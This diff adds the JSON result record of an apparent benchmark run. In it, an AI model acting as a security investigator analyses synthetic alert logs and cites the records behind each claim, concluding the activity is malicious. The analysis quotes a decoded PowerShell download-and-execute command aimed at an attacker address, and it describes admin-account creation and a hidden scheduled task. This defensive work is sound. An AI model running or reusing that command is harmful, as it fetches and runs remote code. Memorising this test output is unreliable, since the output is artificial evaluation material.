@@ -1,0 +1,100 @@
+{
+ "run_id": "A__T047__C2__20261115T045937Z",
+ "config": "A",
+ "scenario_id": "T047",
+ "condition": "C2",
+ "model": "gpt-6-luna",
+ "n_records_in_view": 178,
+ "system": "You are a security investigator reviewing an alert. Base every claim only on the evidence available to you. Cite the record IDs that support each observation.",
+ "task_chars": 74083,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.99,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:39:53 UTC, WS-LMARTINS-01 received an RDP connection from 203.0.113.250, followed by a remote-interactive logon for sam.okafor with special privileges.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T047-00063\",\n        \"T047-00064\",\n        \"T047-00065\",\n        \"T047-00066\"\n      ]\n    },\n    {\n      \"claim\": \"At 13:43:55 UTC, sam.okafor created the sysmaint account on the domain controller.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T047-00081\"\n      ]\n    },\n    {\n      \"claim\": \"About one second later, sysmaint was added to the group recorded as Administrators; the group SID ends in RID 512.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T047-00082\"\n      ]\n    },\n    {\n      \"claim\": \"At 13:43:57 UTC, sam.okafor created a scheduled task on WS-LMARTINS-01 that launches PowerShell with a hidden window and an encoded command. Decoding the recorded command yields `IEX (iwr http://203.0.113.250/a.ps1)`.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\n        \"T047-00083\"\n      ]\n    },\n    {\n      \"claim\": \"The remote logon to a user workstation, privileged account creation, addition to the group with RID 512, and hidden PowerShell download task occur in close succession and support a malicious-activity finding.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\n        \"T047-00063\",\n        \"T047-00065\",\n        \"T047-00066\",\n        \"T047-00081\",\n        \"T047-00082\",\n        \"T047-00083\"\n      ]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The supplied records show the scheduled-task registration but do not show whether the task ran or whether the script download succeeded (T047-00083).\",\n    \"The proxy record shows a connection to the internal proxy but does not include the requested URL, HTTP method, or response (T047-00131).\",\n    \"The records show the source address 203.0.113.250 but do not establish who controlled or used that address (T047-00060, T047-00063, T047-00064).\"\n  ],\n  \"claims_not_established\": [\n    \"Whether the scheduled task executed and what the downloaded script contained.\",\n    \"Whether sysmaint was used after creation, or whether the account or sam.okafor's credentials were compromised.\",\n    \"Whether the activity was authorized by sam.okafor; the logs identify the account used but do not establish the human operator.\",\n    \"Whether the address 203.0.113.250 was reachable as an actual external host or was otherwise represented in the environment.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Collect task scheduler operational and process-creation telemetry to determine whether the HealthCheck task ran and what it launched.\",\n    \"Obtain proxy and network logs for the 13:20\u201314:20 UTC window, including request and response details for the task's URL.\",\n    \"Review domain account and group-change audit records, including subsequent authentication and activity for sysmaint.\",\n    \"Validate the RDP session and account activity with sam.okafor and investigate the source address and endpoint involved.\",\n    \"Preserve and investigate WS-LMARTINS-01 and the domain controller for related persistence, payloads, and additional account or group changes.\"\n  ]\n}",
+   "valid": true,
+   "validation_errors": [],
+   "model_returned": "gpt-6-luna",
+   "finish_reason": "stop",
+   "usage": {
+    "input": 27769,
+    "output": 2176,
+    "reasoning": 1307
+   }
+  }
+ ],
+ "error": null,
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.99,
+  "supporting_observations": [
+   {
+    "claim": "At 13:39:53 UTC, WS-LMARTINS-01 received an RDP connection from 203.0.113.250, followed by a remote-interactive logon for sam.okafor with special privileges.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00063",
+     "T047-00064",
+     "T047-00065",
+     "T047-00066"
+    ]
+   },
+   {
+    "claim": "At 13:43:55 UTC, sam.okafor created the sysmaint account on the domain controller.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00081"
+    ]
+   },
+   {
+    "claim": "About one second later, sysmaint was added to the group recorded as Administrators; the group SID ends in RID 512.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00082"
+    ]
+   },
+   {
+    "claim": "At 13:43:57 UTC, sam.okafor created a scheduled task on WS-LMARTINS-01 that launches PowerShell with a hidden window and an encoded command. Decoding the recorded command yields `IEX (iwr http://203.0.113.250/a.ps1)`.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T047-00083"
+    ]
+   },
+   {
+    "claim": "The remote logon to a user workstation, privileged account creation, addition to the group with RID 512, and hidden PowerShell download task occur in close succession and support a malicious-activity finding.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T047-00063",
+     "T047-00065",
+     "T047-00066",
+     "T047-00081",
+     "T047-00082",
+     "T047-00083"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The supplied records show the scheduled-task registration but do not show whether the task ran or whether the script download succeeded (T047-00083).",
+   "The proxy record shows a connection to the internal proxy but does not include the requested URL, HTTP method, or response (T047-00131).",
+   "The records show the source address 203.0.113.250 but do not establish who controlled or used that address (T047-00060, T047-00063, T047-00064)."
+  ],
+  "claims_not_established": [
+   "Whether the scheduled task executed and what the downloaded script contained.",
+   "Whether sysmaint was used after creation, or whether the account or sam.okafor's credentials were compromised.",
+   "Whether the activity was authorized by sam.okafor; the logs identify the account used but do not establish the human operator.",
+   "Whether the address 203.0.113.250 was reachable as an actual external host or was otherwise represented in the environment."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Collect task scheduler operational and process-creation telemetry to determine whether the HealthCheck task ran and what it launched.",
+   "Obtain proxy and network logs for the 13:20\u201314:20 UTC window, including request and response details for the task's URL.",
+   "Review domain account and group-change audit records, including subsequent authentication and activity for sysmaint.",
+   "Validate the RDP session and account activity with sam.okafor and investigate the source address and endpoint involved.",
+   "Preserve and investigate WS-LMARTINS-01 and the domain controller for related persistence, payloads, and additional account or group changes."
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 13,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 21.5
+}
